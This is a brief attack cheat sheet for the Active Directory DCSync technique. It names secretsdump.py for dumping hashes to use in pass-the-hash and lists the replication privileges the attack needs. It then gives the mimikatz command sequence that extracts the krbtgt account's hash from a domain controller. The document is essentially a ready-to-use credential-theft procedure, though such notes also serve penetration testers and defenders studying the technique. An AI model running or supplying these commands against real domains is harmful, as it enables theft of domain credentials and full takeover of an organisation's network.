### Secretsdump.py on an account that is synced with the domain controller to dump hashes to PtH attack.

### Privileges: Replicate Directory Changes, Replicate Directory Changes All

### Usually, Administrators, Domain Admins and Enterprise Admins have this privilege in their accounts.

### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::dcsync /user:KRBTGT_ACCOUNT
